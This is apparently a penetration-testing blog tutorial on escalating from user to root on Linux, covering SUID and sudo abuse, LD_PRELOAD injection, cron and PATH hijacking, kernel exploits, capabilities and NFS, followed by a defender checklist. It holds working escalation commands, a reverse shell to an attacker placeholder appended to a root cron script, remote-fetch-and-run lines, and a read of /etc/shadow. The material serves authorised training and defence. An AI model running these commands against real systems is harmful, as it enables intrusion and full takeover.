Linux Privilege Escalation: From User to Root

📅 Mar 10, 2024 ⏱ 15 min read
#privilege-escalation #linux #suid #sudo #ctf

Privilege escalation is one of the most critical phases of any penetration test or CTF challenge. After gaining an initial foothold on a Linux system, the goal is almost always to elevate from a low-privileged user to root. This post is a comprehensive field guide covering the most common and effective Linux privilege escalation techniques — with real commands, real examples, and the mindset to chain them together effectively.

⚠️ Disclaimer: All techniques described here are for educational purposes and authorised penetration testing only. Never run these against systems you do not own or have explicit written permission to test.

1. Enumeration — Know Before You Strike

Before attempting any escalation, thorough enumeration separates a skilled pentester from someone who just runs random exploits and hopes. The goal is to map the attack surface: what's running, what's misconfigured, and what's world-writable.

Automated Enumeration with LinPEAS

LinPEAS (Linux Privilege Escalation Awesome Script) is the de-facto standard for automated enumeration. It checks hundreds of vectors and colour-codes results by severity.

# Download and run directly from memory (no disk write)
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer to the target and run
wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas.out

# Serve from attacker machine
python3 -m http.server 8000

Beyond automated tools, manual enumeration is irreplaceable. Some key commands to run immediately after shell access:

# System & kernel info
uname -a
cat /etc/os-release
cat /proc/version

# Current user context
id
whoami
groups
sudo -l

# Network context
ip a
ss -tlnp
cat /etc/hosts

# Interesting files
find / -writable -type f 2>/dev/null | grep -v proc
find / -name "*.conf" -readable 2>/dev/null | head -30
cat ~/.bash_history
cat /etc/crontab
ls -la /etc/cron*

Good enumeration will surface 80% of your escalation paths before you've even tried anything. Take notes, correlate findings, and look for chains — a writable config used by a root-owned cron is worth more than either finding alone.

2. SUID / SGID Abuse

Set-User-ID (SUID) and Set-Group-ID (SGID) bits allow a binary to execute with the privileges of its owner rather than the caller. When a root-owned binary has the SUID bit set, any user who executes it effectively runs it as root — a powerful primitive for privilege escalation.

Finding SUID/SGID Binaries

# Find all SUID binaries system-wide
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID in one pass
find / -perm /6000 -type f 2>/dev/null

# Show owner, permissions, and path — easier to triage
find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;

Compare the list against GTFOBins — a curated database of Unix binaries that can be abused when granted SUID, sudo, or other special privileges. Common SUID candidates to look out for: find, vim, python, bash, cp, nmap (older versions), less, awk.

GTFOBins Exploitation Examples

# If /usr/bin/find has SUID bit set:
/usr/bin/find . -exec /bin/sh -p \; -quit
# The -p flag keeps elevated privileges (doesn't drop euid)

# If /usr/bin/vim has SUID:
/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# If /usr/bin/awk has SUID:
/usr/bin/awk 'BEGIN {system("/bin/sh -p")}'

# If /bin/bash itself has SUID (rare but game over):
/bin/bash -p

# Verify you're root:
id
# uid=1001(user) gid=1001(user) euid=0(root) groups=1001(user)

Always check the actual binary path — sometimes a custom binary has SUID set unintentionally. Read the binary with strings or ltrace to understand what it does before exploiting it.

3. Sudo Misconfigurations

The /etc/sudoers file controls what commands users can run as root (or other users) via sudo. Misconfigurations here are extremely common — especially in CTF machines — and can range from trivially exploitable to nuanced.

Enumerating Sudo Rights

$ sudo -l
Matching Defaults entries for www-data on target:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on target:
    (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
    (root) NOPASSWD: /usr/bin/vim /var/www/html/*.conf
    (ALL : ALL) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/less /var/log/*

Each of these entries is exploitable in a different way:

  • python3 /opt/backup.py — If backup.py is writable, inject a shell. If it imports local modules, hijack the import.
  • vim *.conf — Wildcards can be bypassed with shell metacharacters. Even without that, vim can spawn a shell (:!sh).
  • find — GTFOBins: sudo find . -exec /bin/sh \; -quit
  • less /var/log/* — From the pager, type !sh or !/bin/bash to escape to a shell.

LD_PRELOAD / Environment Variable Abuse

If env_keep+=LD_PRELOAD appears in the sudoers defaults, you can inject a shared library into a sudo command:

# 1. Create the malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

# 2. Compile as a shared object
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c

# 3. Run any allowed sudo command with LD_PRELOAD pointing to our library
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find

4. Cron Job Exploitation

Scheduled jobs run as a specific user — often root. If a cron job references a script or binary that a low-privileged user can write to, it becomes a trivial escalation: overwrite the target, wait for the cron to fire, get a shell.

Finding Cron Jobs

# System-wide crontab
cat /etc/crontab

# Per-user crontabs (needs root or the specific user)
ls -la /var/spool/cron/crontabs/

# Drop-in cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/

# Use pspy to monitor processes in real-time without root
wget http://<ATTACKER_IP>:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64

pspy is invaluable — it monitors procfs and shows newly spawned processes, revealing hidden cron jobs that don't appear in any crontab file (e.g., triggered by system units or out-of-band schedulers).

Exploiting a Writable Cron Script

Suppose /etc/crontab contains:

* * * * * root /opt/scripts/cleanup.sh

# Check permissions:
ls -la /opt/scripts/cleanup.sh
# -rwxrwxr-x 1 root root 45 Mar 10 09:00 /opt/scripts/cleanup.sh
# World-writable! Append a reverse shell:

echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /opt/scripts/cleanup.sh

# Set up listener on attacker:
nc -lvnp 4444

# Wait up to 60 seconds for the cron to fire — then enjoy root.

Another variant: the cron script exists but calls a binary whose path is writable (see PATH abuse, below). Always check what a cron script actually calls, not just the script itself.

5. Writable PATH Abuse

If a SUID binary, sudo command, or cron script calls another program by name rather than absolute path, and you can prepend a writable directory to PATH, you can hijack the call.

# Suppose the SUID binary /usr/local/bin/sysinfo calls 'id' without a full path.
# Verify with: strings /usr/local/bin/sysinfo | grep -v lib
# Output might show: id, uname, df — unqualified names!

# Create a fake 'id' that spawns a shell:
echo '#!/bin/bash' > /tmp/id
echo '/bin/bash -p' >> /tmp/id
chmod +x /tmp/id

# Prepend /tmp to PATH and run the SUID binary:
export PATH=/tmp:$PATH
/usr/local/bin/sysinfo

# Result: root shell, because sysinfo runs our /tmp/id as root via SUID

The same technique applies to sudo commands with SETENV or an absent secure_path in sudoers. Always use strings and strace to understand what a binary actually calls.

6. Kernel Exploits

Kernel exploits are the "big guns" — they escalate privileges by exploiting vulnerabilities in the kernel itself. They are powerful but risky: a bad exploit can crash the target. Always prefer other vectors first, and use kernel exploits as a last resort or when the environment is known stable.

# Check kernel version
uname -r
# Example: 4.4.0-116-generic

cat /proc/version
# Linux version 4.4.0-116-generic (gcc version 5.4.0)

# Check for known CVEs using linux-exploit-suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh

# DirtyCow (CVE-2016-5195) — affects kernels 2.6.22 to 4.8.3
# One of the most widespread LPE CVEs ever found
searchsploit dirty cow
# Compile and run appropriate PoC from Exploit-DB

# Overlayfs (CVE-2023-0386) — affects kernels before 6.2
# PwnKit (CVE-2021-4034) — polkit pkexec, affects most Linux distros
wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh
chmod +x cve-2021-4034.sh && ./cve-2021-4034.sh

Use the Linux Exploit Suggester script to cross-reference the kernel version with known CVEs automatically. It outputs colour-coded results with links to PoCs. Kernel 4.x is still found in the wild on older servers — DirtyCow remains highly reliable on unpatched 4.4.x systems.

7. Linux Capabilities

Linux capabilities are a fine-grained privilege decomposition of the root privilege set. Instead of running a binary as root, a specific capability can be granted (e.g., CAP_NET_RAW for raw socket access). However, some capabilities — particularly cap_setuid — effectively grant root-level escalation when assigned to an interpreter or tool.

# Find binaries with elevated capabilities
getcap -r / 2>/dev/null

# Example dangerous output:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/ruby = cap_setuid+ep
# /usr/bin/tar = cap_dac_read_search+ep

# Exploit cap_setuid on python3:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Exploit cap_setuid on perl:
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Exploit cap_dac_read_search on tar (read any file, e.g. /etc/shadow):
/usr/bin/tar -cf /tmp/shadow.tar /etc/shadow 2>/dev/null
/usr/bin/tar -xf /tmp/shadow.tar -C /tmp
cat /tmp/etc/shadow

cap_setuid+ep means the capability is effective and permitted — the binary can call setuid(0) to become root at runtime. This is as dangerous as SUID but less visible and often overlooked during hardening reviews. Always run getcap -r / 2>/dev/null in your enumeration checklist.

8. NFS No-Root-Squash Exploitation

Network File System (NFS) shares configured with no_root_squash allow a remote root user to interact with the share as root. If an attacker has root on their own machine and can mount the NFS share, they can create SUID binaries on the share that execute as root on the target.

# On the TARGET — check NFS exports
cat /etc/exports
# Example misconfigured output:
# /home/victim  *(rw,sync,no_root_squash,no_subtree_check)

# On the ATTACKER (as root) — mount the remote share
showmount -e <TARGET_IP>
mkdir /mnt/nfs_target
mount -t nfs <TARGET_IP>:/home/victim /mnt/nfs_target -o nolock

# Create a SUID bash copy on the share (runs as root because no_root_squash)
cp /bin/bash /mnt/nfs_target/privesc_bash
chmod +s /mnt/nfs_target/privesc_bash

# Back on the TARGET (as low-priv user):
ls -la ~/privesc_bash
# -rwsr-sr-x 1 root root 1234560 Mar 10 privesc_bash
~/privesc_bash -p
# bash-5.1# id
# uid=1001(victim) gid=1001(victim) euid=0(root)

# Clean up afterwards:
rm ~/privesc_bash
umount /mnt/nfs_target  # on attacker

The fix is always to add root_squash (or remove no_root_squash) to the exports file, but it's surprisingly common to see misconfigured NFS in internal networks and older CTF boxes.

9. Chaining Techniques

Real-world privilege escalation rarely hinges on a single silver bullet. Often, you'll chain multiple lower-severity findings into a full escalation path. A common chain looks like this:

  1. Enumerate → find a cron job running as root every minute, executing /opt/monitor.sh.
  2. Inspect → monitor.sh calls curl without a full path.
  3. PATH abuse → create a malicious curl in /tmp, prepend /tmp to PATH in a writable environment file sourced by the cron job.
  4. Shell → when the cron fires, our fake curl runs as root and connects back.

Thinking in chains and relationships — rather than isolated misconfigs — is what separates effective privilege escalation from button-mashing. Always ask: "What else uses this file / binary / variable?"

10. Remediation Checklist

For defenders and blue teamers, here's a quick hardening checklist to close off the most common escalation vectors:

  • Audit SUID/SGID binaries regularly: find / -perm /6000 -type f 2>/dev/null. Remove the bit from anything that doesn't strictly need it.
  • Review /etc/sudoers — avoid wildcard paths, never use NOPASSWD for powerful interpreters, always use secure_path.
  • Ensure cron scripts and their dependencies are root-owned and not world-writable.
  • Regularly apply kernel and package updates — most kernel exploits target known, patched CVEs.
  • Audit capabilities with getcap -r / and remove any unneeded cap_setuid or cap_dac_override grants.
  • Always configure NFS exports with root_squash and restrict access to specific subnets rather than *.
  • Deploy tools like auditd, Falco, or AIDE to detect anomalous privilege escalation attempts at runtime.

Conclusion

Linux privilege escalation is a broad, layered discipline. No two machines are the same, and no single checklist covers every edge case. The most important skill is methodical thinking: enumerate deeply, understand what you're looking at, and reason about relationships between misconfigurations rather than treating each finding in isolation.

Start every engagement with LinPEAS and sudo -l, manually verify the most promising leads, and always check GTFOBins before writing custom exploits. With practice, spotting privilege escalation paths becomes almost instinctive — but the fundamentals covered here will get you root on the vast majority of CTF machines and many real-world systems.

Happy hacking — responsibly. 🔐
